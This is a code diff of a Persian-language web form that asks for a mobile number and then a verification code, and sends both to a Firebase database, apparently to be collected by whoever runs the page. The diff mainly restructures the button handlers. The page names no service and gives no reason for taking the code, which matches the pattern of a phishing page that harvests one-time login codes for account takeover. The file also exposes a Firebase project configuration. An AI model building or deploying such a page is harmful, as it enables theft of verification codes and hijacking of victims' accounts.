@@ -1,14 +1,12 @@
 <!DOCTYPE html>
 <html lang="fa" dir="rtl">
 <head>
-
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
 <title>ثبت اطلاعات</title>
 
 <style>
-
 body{
     margin:0;
     background:#000;
@@ -63,17 +61,13 @@ button{
     margin-top:20px;
     font-size:18px;
 }
-
 </style>
 
 </head>
 
-
 <body>
 
-
 <div class="box">
-
 
 <div id="page1">
 
@@ -81,12 +75,9 @@ button{
 
 <input id="phone" placeholder="شماره موبایل">
 
-<button id="nextBtn">
-ادامه
-</button>
+<button onclick="nextPage()">ادامه</button>
 
 </div>
-
 
 
 <div id="page2" class="page">
@@ -97,15 +88,9 @@ button{
 
 <input id="code" placeholder="کد">
 
-
-<button id="finishBtn">
-تأیید
-</button>
-
+<button onclick="finish()">تأیید</button>
 
 </div>
-
-
 
 
 <div id="page3" class="page">
@@ -118,42 +103,27 @@ button{
 
 </div>
 
-
-
 </div>
-
 
 
 <script type="module">
 
-
 import { initializeApp } 
 from "https://www.gstatic.com/firebasejs/12.16.0/firebase-app.js";
-
 
 import { getDatabase, ref, push } 
 from "https://www.gstatic.com/firebasejs/12.16.0/firebase-database.js";
 
 
-
 const firebaseConfig = {
-
-apiKey:"AIzaSyAUPnkLgHdNw2jXRe76gQ113_6aCiAFtXo",
-
-authDomain:"la3nazr.firebaseapp.com",
-
-databaseURL:"https://la3nazr-default-rtdb.firebaseio.com",
-
-projectId:"la3nazr",
-
-storageBucket:"la3nazr.firebasestorage.app",
-
-messagingSenderId:"819824551752",
-
-appId:"1:819824551752:web:87e8a2555c6df97edeb57d"
-
+ apiKey: "AIzaSyAUPnkLgHdNw2jXRe76gQ113_6aCiAFtXo",
+ authDomain: "la3nazr.firebaseapp.com",
+ databaseURL: "https://la3nazr-default-rtdb.firebaseio.com",
+ projectId: "la3nazr",
+ storageBucket: "la3nazr.firebasestorage.app",
+ messagingSenderId: "819824551752",
+ appId: "1:819824551752:web:87e8a2555c6df97edeb57d"
 };
-
 
 
 const app = initializeApp(firebaseConfig);
@@ -161,78 +131,49 @@ const app = initializeApp(firebaseConfig);
 const db = getDatabase(app);
 
 
-
 let phone="";
 
 
+window.nextPage=function(){
 
-document
-.getElementById("nextBtn")
-.addEventListener("click",()=>{
+phone=document.getElementById("phone").value.trim();
 
-
-phone =
-document.getElementById("phone").value.trim();
-
-
-
-if(phone===""){
-
+if(phone==""){
 alert("شماره را وارد کنید");
-
 return;
-
 }
-
-
 
 document.getElementById("page1").style.display="none";
-
 document.getElementById("page2").style.display="block";
-
-
-
-});
-
-
-
-
-
-
-document
-.getElementById("finishBtn")
-.addEventListener("click",()=>{
-
-
-let code =
-document.getElementById("code").value.trim();
-
-
-
-if(code===""){
-
-alert("کد را وارد کنید");
-
-return;
 
 }
 
 
+
+window.finish=function(){
+
+let code=document.getElementById("code").value.trim();
+
+
+if(code==""){
+alert("کد را وارد کنید");
+return;
+}
 
 
 push(ref(db,"users"),{
 
+phone: phone,
 
-phone:phone,
+code: code,
 
-code:code,
-
-time:new Date().toLocaleString("fa-IR")
-
+time: new Date().toLocaleString("fa-IR")
 
 })
 
 .then(()=>{
+
+console.log("اطلاعات ذخیره شد");
 
 
 document.getElementById("page2").style.display="none";
@@ -242,26 +183,22 @@ document.getElementById("page3").style.display="block";
 
 })
 
-
 .catch((error)=>{
 
 
-alert("خطا در ذخیره اطلاعات");
+console.log("Firebase Error:",error);
 
 
-console.log(error);
-
-
-});
-
+alert("خطا در ذخیره اطلاعات: "+error.message);
 
 
 });
 
+
+}
 
 
 </script>
-
 
 </body>
 </html>
